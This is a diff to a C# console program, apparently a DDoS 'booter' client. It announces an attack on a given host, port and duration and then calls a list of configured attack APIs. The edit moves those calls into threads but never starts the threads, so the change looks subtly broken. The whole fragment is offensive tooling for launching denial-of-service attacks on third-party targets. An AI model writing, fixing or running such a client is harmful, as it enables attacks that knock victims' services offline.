@@ -37,7 +37,9 @@ namespace Console_Booter
                             ConsoleShort.WriteLine("Attack Launched Against " + String.Format("Host: {0} Port: {1} Time: {2}", ipTarget, portTarget, timeTarget), ConsoleColor.Green);
                             for (int i = 0; i < Config.APIs.Length; i++)
                             {
-                                Functions.MakeRequest(Config.APIs[i], false);
+                                string api = Config.APIs[i];
+                                Thread thread = new Thread(() => WorkThread(api));
+                                //Functions.MakeRequest(Config.APIs[i], false); -
                             }
                         }
                         else
@@ -60,6 +62,10 @@ namespace Console_Booter
             {
                 ConsoleShort.WriteLine("An error has occurred:  " + ex.InnerException, ConsoleColor.Red);
             }
+        }
+         static void WorkThread(string apis)
+        {
+            Functions.MakeRequest(apis, false);
         }
          static Boolean AsArgs(string[] getArg)
          {
